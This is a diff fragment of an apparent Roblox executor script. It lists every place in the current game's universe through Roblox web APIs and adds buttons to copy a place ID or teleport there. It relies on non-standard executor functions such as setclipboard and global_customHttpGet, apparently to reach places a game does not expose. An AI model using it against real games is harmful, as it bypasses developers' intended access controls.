+    placeIdLabel.TextSize = 14
+    placeIdLabel.Text = tostring(placeId)
+    placeIdLabel.BorderSizePixel = 0
+    placeIdLabel.BorderColor3 = Color3.fromRGB(27, 27, 27)
+    placeIdLabel.Parent = gameIdFrame
+
+    local placeNameLabel = Instance.new("TextLabel")
+    placeNameLabel.Name = "placeName"
+    placeNameLabel.Size = UDim2.new(0, 106, 0, 17)
+    placeNameLabel.Position = UDim2.new(0.308, 0, 0, 0)
+    placeNameLabel.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
+    placeNameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    placeNameLabel.Font = Enum.Font.SourceSansBold
+    placeNameLabel.TextSize = 14
+    placeNameLabel.Text = tostring(placeName)
+    placeNameLabel.BorderSizePixel = 0
+    placeNameLabel.BorderColor3 = Color3.fromRGB(27, 27, 27)
+    placeNameLabel.Parent = gameIdFrame
+
+    local copyIdButton = Instance.new("TextButton")
+    copyIdButton.Name = "copyIdButton"
+    copyIdButton.Size = UDim2.new(0, 96, 0, 17)
+    copyIdButton.Position = UDim2.new(0.57628, 0, 0, 0)
+    copyIdButton.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
+    copyIdButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    copyIdButton.Font = Enum.Font.SourceSansBold
+    copyIdButton.TextSize = 14
+    copyIdButton.Text = "Copy PlaceId"
+    copyIdButton.BorderSizePixel = 0
+    copyIdButton.BorderColor3 = Color3.fromRGB(27, 27, 27)
+    copyIdButton.Parent = gameIdFrame
+
+    copyIdButton.MouseButton1Click:Connect(function()
+        if setclipboard then
+            setclipboard(tostring(placeId))
+            game:GetService("StarterGui"):SetCore("SendNotification", {
+                Title = "📋 Copied to Clipboard!",
+                Text = "PlaceId copied: " .. tostring(placeId),
+                Duration = 3
+            })
+        end
+    end)
+
+    local teleportButton = Instance.new("TextButton")
+    teleportButton.Name = "TeleportButton"
+    teleportButton.Size = UDim2.new(0, 72, 0, 17)
+    teleportButton.Position = UDim2.new(0.81696, 0, 0, 0)
+    teleportButton.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
+    teleportButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    teleportButton.Font = Enum.Font.SourceSansBold
+    teleportButton.TextSize = 14
+    teleportButton.Text = "Teleport !"
+    teleportButton.BorderSizePixel = 0
+    teleportButton.BorderColor3 = Color3.fromRGB(27, 27, 27)
+    teleportButton.Parent = gameIdFrame
+
+    teleportButton.MouseButton1Click:Connect(function()
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "🚀 Teleporting!",
+            Text = "Teleporting to PlaceId: " .. tostring(placeId),
+            Duration = 3
+        })
+        if game:GetService("TeleportService") then
+            game:GetService("TeleportService"):Teleport(tonumber(placeId))
+        end
+    end)
+end
+
+-- placeId scanner: ui library
+local HttpService = game:GetService("HttpService")
+task.spawn(function()
+    local success, info = pcall(function()
+        local url = "https://games.roblox.com/v1/games/multiget-place-details?placeIds=" .. tostring(game.PlaceId)
+        local response = global_customHttpGet(url)
+        return HttpService:JSONDecode(response)
+    end)
+
+    if success and info and info[1] and info[1].universeId then
+        local universeId = info[1].universeId
+        local api = "https://develop.roblox.com/v1/universes/" .. tostring(universeId) .. "/places?sortOrder=Asc&limit=100"
+        local ok, placesData = pcall(function()
+            local resp = global_customHttpGet(api)
+            return HttpService:JSONDecode(resp)
+        end)
+        if ok and placesData and placesData.data then
+            for _, place in ipairs(placesData.data) do
+                AddPlaceToList(place.id, place.name)
+            end
+        end
+    end
+end)
+
+-- ui library
+local HttpService = game:GetService("HttpService")
+task.spawn(function()
+    while not G2L["b"] or not G2L["c"] do -- UIListLayout
+        wait(0.1)
+    end
+
+    -- ScrollingFrame settings
+    for _, child in ipairs(G2L["b"]:GetChildren()) do
+        if child:IsA("Frame") or child:IsA("TextLabel") or child:IsA("TextButton") then
+            child:Destroy()
+        end
+    end
+
+    -- add's line
+    local line = Instance.new("Frame")
+    line.Name = "Line"
+    line.Size = UDim2.new(0, 403, 0, 1)
+    line.BackgroundColor3 = Color3.fromRGB(64, 64, 64)
+    line.BorderSizePixel = 0
+    line.BorderColor3 = Color3.fromRGB(0, 0, 0)
+    line.Parent = G2L["b"]
+
+    -- gets placeId and universeId http request
+    local success, info = pcall(function()
+        local url = "https://games.roblox.com/v1/games/multiget-place-details?placeIds=" .. tostring(game.PlaceId)
+        local response = global_customHttpGet(url)
+        if debug then
+            print("API URL:", url)
+            print("API Response:", response)
+        end
+        local decoded = HttpService:JSONDecode(response)
+        if debug then
+            print("Decoded universeId:", decoded and decoded[1] and decoded[1].universeId)
+        end
+        return decoded
+    end)
+
+    if not success then
+        print("UniverseId cant get:", info)
+        return
+    end
+
+    if not info or not info[1] or not info[1].universeId then
+        print("the expected data from the API did not arrive:", info)
+        return
+    end
+
+    local universeId = info[1].universeId
+    local api = "https://develop.roblox.com/v1/universes/" .. tostring(universeId) .. "/places?sortOrder=Asc&limit=100"
+    local ok, placesData = pcall(function()
+        local resp = global_customHttpGet(api)
+        return HttpService:JSONDecode(resp)
+    end)
+    if not ok then
+        print("cant get place id list:", placesData)
+        return
+    end
+    if placesData and placesData.data then
+        for _, place in ipairs(placesData.data) do
+            -- Her place için bir GameIdFrame oluştur
+            local gameIdFrame = Instance.new("Frame")
+            gameIdFrame.Name = "GameIdFrame"
+            gameIdFrame.Size = UDim2.new(0, 399, 0, 17)
+            gameIdFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+            gameIdFrame.BorderSizePixel = 0
+            gameIdFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+            gameIdFrame.Parent = G2L["b"]
+
+            local placeIdLabel = Instance.new("TextLabel")
+            placeIdLabel.Name = "placeId"
+            placeIdLabel.Size = UDim2.new(0, 120, 0, 17)
+            placeIdLabel.Position = UDim2.new(0, 0, 0, 0)
+            placeIdLabel.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
+            placeIdLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+            placeIdLabel.Font = Enum.Font.SourceSansBold
+            placeIdLabel.TextSize = 14
+            placeIdLabel.Text = tostring(place.id)
+            placeIdLabel.BorderSizePixel = 0
+            placeIdLabel.BorderColor3 = Color3.fromRGB(27, 27, 27)
+            placeIdLabel.Parent = gameIdFrame
+
+            local placeNameLabel = Instance.new("TextLabel")
+            placeNameLabel.Name = "placeName"
+            placeNameLabel.Size = UDim2.new(0, 106, 0, 17)
+            placeNameLabel.Position = UDim2.new(0.308, 0, 0, 0)
+            placeNameLabel.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
+            placeNameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+            placeNameLabel.Font = Enum.Font.SourceSansBold
+            placeNameLabel.TextSize = 14
+            placeNameLabel.Text = tostring(place.name)
+            placeNameLabel.BorderSizePixel = 0
+            placeNameLabel.BorderColor3 = Color3.fromRGB(27, 27, 27)
+            placeNameLabel.Parent = gameIdFrame
+
+            local copyIdButton = Instance.new("TextButton")
+            copyIdButton.Name = "copyIdButton"
+            copyIdButton.Size = UDim2.new(0, 96, 0, 17)
+            copyIdButton.Position = UDim2.new(0.57628, 0, 0, 0)
+            copyIdButton.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
+            copyIdButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+            copyIdButton.Font = Enum.Font.SourceSansBold
+            copyIdButton.TextSize = 14
+            copyIdButton.Text = "Copy PlaceId"
+            copyIdButton.BorderSizePixel = 0
+            copyIdButton.BorderColor3 = Color3.fromRGB(27, 27, 27)
+            copyIdButton.Parent = gameIdFrame
+
+            copyIdButton.MouseButton1Click:Connect(function()
+                if setclipboard then
+                    setclipboard(tostring(place.id))
+                    game:GetService("StarterGui"):SetCore("SendNotification", {
+                        Title = "📋 Copied to Clipboard!",
+                        Text = "PlaceId copied: " .. tostring(place.id),
+                        Duration = 3
+                    })
+                end
+            end)
+
+            local teleportButton = Instance.new("TextButton")
+            teleportButton.Name = "TeleportButton"
+            teleportButton.Size = UDim2.new(0, 72, 0, 17)
+            teleportButton.Position = UDim2.new(0.81696, 0, 0, 0)
+            teleportButton.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
+            teleportButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+            teleportButton.Font = Enum.Font.SourceSansBold
+            teleportButton.TextSize = 14
+            teleportButton.Text = "Teleport !"
+            teleportButton.BorderSizePixel = 0
+            teleportButton.BorderColor3 = Color3.fromRGB(27, 27, 27)
+            teleportButton.Parent = gameIdFrame
+
+            teleportButton.MouseButton1Click:Connect(function()
+                game:GetService("StarterGui"):SetCore("SendNotification", {
+                    Title = "🚀 Teleporting!",
+                    Text = "Teleporting to PlaceId: " .. tostring(place.id),
+                    Duration = 3
+                })
+                if game:GetService("TeleportService") then
+                    game:GetService("TeleportService"):Teleport(tonumber(place.id))
+                end
+            end)
+
+            -- gameIdFrame later add's line
+            local line = Instance.new("Frame")
+            line.Name = "Line"
+            line.Size = UDim2.new(0, 403, 0, 1)
+            line.BackgroundColor3 = Color3.fromRGB(64, 64, 64)
+            line.BorderSizePixel = 0
+            line.BorderColor3 = Color3.fromRGB(0, 0, 0)
+            line.Parent = G2L["b"]
+        end
+    else
+        print("place list is empty or can't scanned :", placesData)
+    end
+end)
+
+return G2L["1"], require;
